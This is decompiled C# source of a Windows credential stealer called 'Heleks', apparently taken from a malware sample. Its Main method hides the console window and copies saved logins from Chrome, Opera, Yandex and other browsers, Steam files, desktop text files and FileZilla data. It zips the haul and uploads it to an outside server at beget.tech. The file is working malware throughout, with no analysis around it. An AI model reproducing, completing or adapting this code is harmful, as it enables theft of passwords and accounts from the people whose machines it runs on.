// Decompiled with JetBrains decompiler
// Type: Project_Stealer.Program
// Assembly: Heleks_IL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FBB44E79-1326-4A0E-9F49-E3687B1B8C49
// Assembly location: C:\Users\Пользователь\Desktop\Dumps\Heleks.exe

using Ionic.Zip;
using Steeal;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Project_Stealer
{
  internal class Program
  {
    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    public static void AllSteal()
    {
      string str = Path.GetTempPath() + "\\";
      string path1 = str + "StealerByHeleks\\DesktopTxts";
      string path2 = str + "StealerByHeleks\\Steam";
      string path3 = str + "StealerByHeleks\\Browsers";
      new WebClient().DownloadString("http://icanhazip.com");
      try
      {
        if (!Directory.Exists(str + "StealerByHeleks"))
        {
          Directory.CreateDirectory(str + "StealerByHeleks");
        }
        else
        {
          Directory.Delete(str + "StealerByHeleks", true);
          Directory.CreateDirectory(str + "StealerByHeleks");
        }
        if (!Directory.Exists(path1))
          Directory.CreateDirectory(path1);
        if (!Directory.Exists(path2))
          Directory.CreateDirectory(path2);
        if (!Directory.Exists(path3))
          Directory.CreateDirectory(path3);
      }
      catch
      {
      }
      Stealers.Steal_Steam();
      Stealers.Steal_txt();
      Stealers.Steal_Browser("chrome", "\\Google\\Chrome\\User Data\\Default\\Login Data", "chrome");
      Stealers.Steal_Browser("firefox", "\\Opera\\Opera\\profile\\wand.dat", "firefox");
      Stealers.Steal_Browser("browser", "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data", "yandex");
      Stealers.Steal_Browser("opera", "\\Opera Software\\Opera Stable\\Login Data", "opera");
      Stealers.Steal_Browser("kometa", "\\Kometa\\User Data\\Default\\Login Data", "kometa");
      Stealers.Steal_Browser("amigo", "\\Amigo\\User\\User Data\\Default\\Login Data", "amigo");
      Stealers.Steal_Browser("Torch", "\\Torch\\User Data\\Default\\Login Data", "Torch");
      Stealers.Steal_Browser("orbitum", "\\Orbitum\\User Data\\Default\\Login Data", "orbitum");
      Stealers.Steal_Browser("Comodo Dragon", "\\Comodo\\User Data\\Default\\Login Data", "Comodo Dragon");
      Stealers.Steal_FileZila();
    }

    public static string getCPUID()
    {
      string str = "";
      foreach (ManagementObject instance in new ManagementClass("win32_processor").GetInstances())
      {
        if (str == "")
        {
          str = instance.Properties["processorID"].Value.ToString();
          break;
        }
      }
      return str;
    }

    public static void Zipping()
    {
      string zipsecond = Path.GetTempPath() + "\\" + Environment.MachineName + "_" + Program.getCPUID() + "_logs.zip";
      if (System.IO.File.Exists(zipsecond))
      {
        try
        {
          System.IO.File.Delete(zipsecond);
        }
        catch
        {
        }
      }
      new Thread((ThreadStart) (() =>
      {
        Thread.CurrentThread.IsBackground = true;
        using (ZipFile zipFile = new ZipFile())
        {
          zipFile.AddDirectory(Path.GetTempPath() + "\\StealerByHeleks");
          zipFile.Save(zipsecond);
        }
      })).Start();
    }

    public static void sendongate()
    {
      string fileName = Path.GetTempPath() + "\\" + Environment.MachineName + "_" + Program.getCPUID() + "_logs.zip";
      try
      {
        WebClient webClient = new WebClient();
        webClient.Headers.Add("Content-Type", "binary/octet-stream");
        byte[] bytes = webClient.UploadFile("http://v98512qx.beget.tech/uploadlogs.php?login=heleks", "POST", fileName);
        Encoding.UTF8.GetString(bytes, 0, bytes.Length);
      }
      catch
      {
      }
    }

    private static void Main()
    {
      Program.ShowWindow(Program.GetConsoleWindow(), 0);
      Program.AllSteal();
      Program.Zipping();
      Program.sendongate();
    }
  }
}
